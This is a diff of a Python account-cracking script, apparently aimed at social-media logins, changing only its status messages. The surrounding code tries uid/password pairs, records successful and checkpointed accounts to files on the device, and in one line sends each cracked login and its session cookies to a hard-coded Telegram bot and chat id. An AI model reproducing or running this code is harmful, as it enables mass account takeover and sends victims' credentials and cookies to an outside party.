@@ -561,7 +561,7 @@ def gxdsAPI(uid, pxss, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
     sys.stdout.write(
-        f"\r\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s" % (loop, tl, len(cps), len(oks))
+        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s" % (loop, tl, len(cps), len(oks))
     ),
     sys.stdout.flush()
     try:
@@ -617,7 +617,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lgr}  [GXDS-HITS] {uid} : {ps} ~{yellow} {yrs}""")
+                print(f"""\r\r{lgr}  [✓] {uid} : {ps} ~{yellow} {yrs}""")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={uid}:{ps} - {yrs}\n{coki}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
@@ -630,7 +630,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lr}  [GXDS-CP] {uid} : {ps} ~{yellow} {yrs}""")
+                print(f"""\r\r{lr}  [X] {uid} : {ps} ~{yellow} {yrs}""")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
